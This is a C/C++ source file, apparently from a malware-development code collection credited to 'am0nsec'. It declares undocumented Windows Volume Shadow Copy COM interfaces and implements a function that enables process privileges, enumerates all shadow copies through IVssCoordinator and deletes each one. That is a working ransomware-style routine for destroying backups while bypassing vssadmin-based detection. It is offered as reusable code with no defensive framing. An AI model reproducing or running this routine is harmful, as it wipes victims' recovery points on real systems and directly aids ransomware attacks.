/*

Credit: am0nsec
*/

CONST IID IID_IVssCoordinator = { 0xda9f41d4, 0x1a5d, 0x41d0, {0xa6, 0x14, 0x6d, 0xfd, 0x78, 0xdf, 0x5d, 0x05} };
CONST IID CLSID_CVssCoordinator = { 0xe579ab5f, 0x1cc4, 0x44b4, {0xbe, 0xd9, 0xde, 0x09, 0x91, 0xff, 0x06, 0x23} };
typedef GUID VSS_ID;
typedef WCHAR* VSS_PWSZ;
typedef LONGLONG VSS_TIMESTAMP;

typedef enum _VSS_SNAPSHOT_STATE {
	VSS_SS_UNKNOWN = 0,
	VSS_SS_PREPARING = (VSS_SS_UNKNOWN + 1),
	VSS_SS_PROCESSING_PREPARE = (VSS_SS_PREPARING + 1),
	VSS_SS_PREPARED = (VSS_SS_PROCESSING_PREPARE + 1),
	VSS_SS_PROCESSING_PRECOMMIT = (VSS_SS_PREPARED + 1),
	VSS_SS_PRECOMMITTED = (VSS_SS_PROCESSING_PRECOMMIT + 1),
	VSS_SS_PROCESSING_COMMIT = (VSS_SS_PRECOMMITTED + 1),
	VSS_SS_COMMITTED = (VSS_SS_PROCESSING_COMMIT + 1),
	VSS_SS_PROCESSING_POSTCOMMIT = (VSS_SS_COMMITTED + 1),
	VSS_SS_PROCESSING_PREFINALCOMMIT = (VSS_SS_PROCESSING_POSTCOMMIT + 1),
	VSS_SS_PREFINALCOMMITTED = (VSS_SS_PROCESSING_PREFINALCOMMIT + 1),
	VSS_SS_PROCESSING_POSTFINALCOMMIT = (VSS_SS_PREFINALCOMMITTED + 1),
	VSS_SS_CREATED = (VSS_SS_PROCESSING_POSTFINALCOMMIT + 1),
	VSS_SS_ABORTED = (VSS_SS_CREATED + 1),
	VSS_SS_DELETED = (VSS_SS_ABORTED + 1),
	VSS_SS_POSTCOMMITTED = (VSS_SS_DELETED + 1),
	VSS_SS_COUNT = (VSS_SS_POSTCOMMITTED + 1)
} VSS_SNAPSHOT_STATE;

typedef enum _VSS_OBJECT_TYPE {
	VSS_OBJECT_UNKNOWN = 0,
	VSS_OBJECT_NONE = (VSS_OBJECT_UNKNOWN + 1),
	VSS_OBJECT_SNAPSHOT_SET = (VSS_OBJECT_NONE + 1),
	VSS_OBJECT_SNAPSHOT = (VSS_OBJECT_SNAPSHOT_SET + 1),
	VSS_OBJECT_PROVIDER = (VSS_OBJECT_SNAPSHOT + 1),
	VSS_OBJECT_TYPE_COUNT = (VSS_OBJECT_PROVIDER + 1)
} VSS_OBJECT_TYPE;

typedef enum _VSS_PROVIDER_TYPE {
	VSS_PROV_UNKNOWN = 0,
	VSS_PROV_SYSTEM = 1,
	VSS_PROV_SOFTWARE = 2,
	VSS_PROV_HARDWARE = 3,
	VSS_PROV_FILESHARE = 4
} VSS_PROVIDER_TYPE;

typedef struct _VSS_SNAPSHOT_PROP {
	VSS_ID m_SnapshotId;
	VSS_ID m_SnapshotSetId;
	LONG m_lSnapshotsCount;
	VSS_PWSZ m_pwszSnapshotDeviceObject;
	VSS_PWSZ m_pwszOriginalVolumeName;
	VSS_PWSZ m_pwszOriginatingMachine;
	VSS_PWSZ m_pwszServiceMachine;
	VSS_PWSZ m_pwszExposedName;
	VSS_PWSZ m_pwszExposedPath;
	VSS_ID m_ProviderId;
	LONG m_lSnapshotAttributes;
	VSS_TIMESTAMP m_tsCreationTimestamp;
	VSS_SNAPSHOT_STATE m_eStatus;
} VSS_SNAPSHOT_PROP;

typedef struct _VSS_PROVIDER_PROP {
	VSS_ID m_ProviderId;
	VSS_PWSZ m_pwszProviderName;
	VSS_PROVIDER_TYPE m_eProviderType;
	VSS_PWSZ m_pwszProviderVersion;
	VSS_ID m_ProviderVersionId;
	CLSID m_ClassId;
} VSS_PROVIDER_PROP;

typedef union __MIDL___MIDL_itf_vss_0000_0000_0001 {
	VSS_SNAPSHOT_PROP Snap;
	VSS_PROVIDER_PROP Prov;
} VSS_OBJECT_UNION;

typedef struct _VSS_OBJECT_PROP {
	VSS_OBJECT_TYPE Type;
	VSS_OBJECT_UNION Obj;
} VSS_OBJECT_PROP;

struct __declspec(uuid("AE1C7110-2F60-11d3-8A39-00C04F72D8E3"))
	IVssEnumObject : public IUnknown {
#pragma warning( push )
#pragma warning( disable : 28285)
	virtual HRESULT __stdcall Next(ULONG, __RPC__out_ecount_part(celt, *pceltFetched) VSS_OBJECT_PROP*, ULONG*) = 0;
#pragma warning( pop ) 
	virtual HRESULT __stdcall Skip(ULONG) = 0;
	virtual HRESULT __stdcall Reset(VOID) = 0;
	virtual HRESULT __stdcall Clone(IVssEnumObject**) = 0;
};

struct __declspec(uuid("507C37B4-CF5B-4e95-B0AF-14EB9767467E"))
	IVssAsync : public IUnknown {
	virtual HRESULT __stdcall Cancel(VOID) = 0;
	virtual HRESULT __stdcall Wait(DWORD dwMilliseconds = 0xffffffff) = 0;
	virtual HRESULT __stdcall QueryStatus(HRESULT*, INT*) = 0;
};

struct __declspec(uuid("{da9f41d4-1a5d-41d0-a614-6dfd78df5d05}"))
	IVssCoordinator : public IUnknown {
	virtual HRESULT __stdcall SetContext(LONG) = 0;
	virtual HRESULT __stdcall StartSnapshotSet(LPGUID) = 0;
	virtual HRESULT __stdcall AddToSnapshotSet(PWCHAR, GUID, LPGUID) = 0;
	virtual HRESULT __stdcall DoSnapshotSet(IDispatch*, IVssAsync**) = 0;
	virtual HRESULT __stdcall GetSnapshotProperties(GUID, VSS_SNAPSHOT_PROP*) = 0;
	virtual HRESULT __stdcall ExposeSnapshot(GUID, PWCHAR, LONG, PWCHAR, PWCHAR*) = 0;
	virtual HRESULT __stdcall ImportSnapshots(PUSHORT, IVssAsync**) = 0;
	virtual HRESULT __stdcall Query(GUID, VSS_OBJECT_TYPE, VSS_OBJECT_TYPE, IVssEnumObject**) = 0;
	virtual HRESULT __stdcall DeleteSnapshots(GUID, VSS_OBJECT_TYPE, INT, PLONG, LPGUID) = 0;
	virtual HRESULT __stdcall BreakSnapshotSet(GUID) = 0;
	virtual HRESULT __stdcall RevertToSnapshot(GUID, INT) = 0;
	virtual HRESULT __stdcall QueryRevertStatus(PWCHAR, IVssAsync**) = 0;
	virtual HRESULT __stdcall IsVolumeSupported(GUID, PWCHAR, PINT) = 0;
	virtual HRESULT __stdcall IsVolumeSnapshotted(GUID, PWCHAR, PINT, PLONG) = 0;
	virtual HRESULT __stdcall SetWriterInstance(LONG, LPGUID) = 0;
};

HRESULT ComDisableGlobalSeh(VOID)
{
	HRESULT Result = S_OK;
	IGlobalOptions* GlobalOptions;

#pragma warning( push )
#pragma warning( disable : 6387)
	Result = CoCreateInstance(CLSID_GlobalOptions, NULL, CLSCTX_INPROC_SERVER, IID_PPV_ARGS(&GlobalOptions));
#pragma warning( pop )
	if (!SUCCEEDED(Result))
		goto EXIT_ROUTINE;

	Result = GlobalOptions->Set(COMGLB_EXCEPTION_HANDLING, COMGLB_EXCEPTION_DONOT_HANDLE);

	GlobalOptions->Release();

EXIT_ROUTINE:

	return Result;
}

DWORD InitializeComWithSecurityContextDefault(BOOL DisableSeh)
{
	HRESULT Result = S_OK;

	Result = CoInitializeEx(NULL, 0);
	if (!SUCCEEDED(Result))
		goto EXIT_ROUTINE;

	Result = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IDENTIFY, NULL, EOAC_NONE, NULL);
	if (!SUCCEEDED(Result))
		goto EXIT_ROUTINE;

	if (DisableSeh)
		Result = ComDisableGlobalSeh();

EXIT_ROUTINE:

	return EhWin32FromHResult(Result);
}

DWORD MpfComVssDeleteShadowVolumeBackups(BOOL CoUninitializeAfterCompletion)
{
	HRESULT Result = S_OK;
	IVssCoordinator* VssCoordinator = NULL;
	VSS_OBJECT_PROP* Snapshots = NULL;
	IVssEnumObject* EnumObject = NULL;
	LONG NumberOfSnapshots = 0;
	ULONG Objects = 16, Retrieved = 0;
	PWCHAR ShadowCopySetId = NULL, ShadowCopyId = NULL;

	if (InitializeComWithSecurityContextDefault(TRUE) != ERROR_SUCCESS)
		goto EXIT_ROUTINE;

	if (!SetProcessPrivilegeToken(1))
		return FALSE;

#pragma warning( push )
#pragma warning( disable : 6387)
	if (!SUCCEEDED(Result = CoCreateInstance(CLSID_CVssCoordinator, NULL, CLSCTX_LOCAL_SERVER, IID_PPV_ARGS(&VssCoordinator))))
		goto EXIT_ROUTINE;
#pragma warning( pop )

	if (!SUCCEEDED(Result = VssCoordinator->SetContext(-1)))
		goto EXIT_ROUTINE;

	if (!SUCCEEDED(Result = VssCoordinator->Query(GUID_NULL, VSS_OBJECT_NONE, VSS_OBJECT_SNAPSHOT, &EnumObject)))
		goto EXIT_ROUTINE;

	Snapshots = (VSS_OBJECT_PROP*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (sizeof(VSS_OBJECT_PROP) * Objects));
	if (Snapshots == NULL)
		goto EXIT_ROUTINE;

	if (!SUCCEEDED(Result = EnumObject->Next(Objects, Snapshots, (PULONG)&NumberOfSnapshots)))
		goto EXIT_ROUTINE;

	ShadowCopySetId = (PWCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (32 * sizeof(WCHAR)));
	if (ShadowCopySetId == NULL)
		goto EXIT_ROUTINE;

	ShadowCopyId = (PWCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (32 * sizeof(WCHAR)));
	if (ShadowCopyId == NULL)
		goto EXIT_ROUTINE;

	while (NumberOfSnapshots--)
	{
		VSS_OBJECT_PROP Element = Snapshots[NumberOfSnapshots];
		LONG Dispose = 0;
		GUID SnapshotDipose = { 0 };
		if (Element.Type != VSS_OBJECT_SNAPSHOT)
			continue;

		RtlZeroMemory(ShadowCopyId, (32 * sizeof(WCHAR)));
		RtlZeroMemory(ShadowCopySetId, (32 * sizeof(WCHAR)));

#pragma warning( push )
#pragma warning( disable : 6386)
		if (StringFromGUID2(Element.Obj.Snap.m_SnapshotId, ShadowCopyId, (32 * sizeof(WCHAR))) == 0)
			continue;
#pragma warning( pop )

#pragma warning( push )
#pragma warning( disable : 6386)
		if (StringFromGUID2(Element.Obj.Snap.m_SnapshotSetId, ShadowCopySetId, (32 * sizeof(WCHAR))) == 0)
			continue;
#pragma warning( pop )

		VssCoordinator->DeleteSnapshots(Element.Obj.Snap.m_SnapshotId, VSS_OBJECT_SNAPSHOT, 1, &Dispose, &SnapshotDipose);
	}

EXIT_ROUTINE:

	if (ShadowCopyId)
		HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, ShadowCopyId);

	if (ShadowCopySetId)
		HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, ShadowCopySetId);

	if (EnumObject)
		EnumObject->Release();

	if (VssCoordinator)
		VssCoordinator->Release();

	if (CoUninitializeAfterCompletion)
		CoUninitialize();

	return EhWin32FromHResult(Result);
}
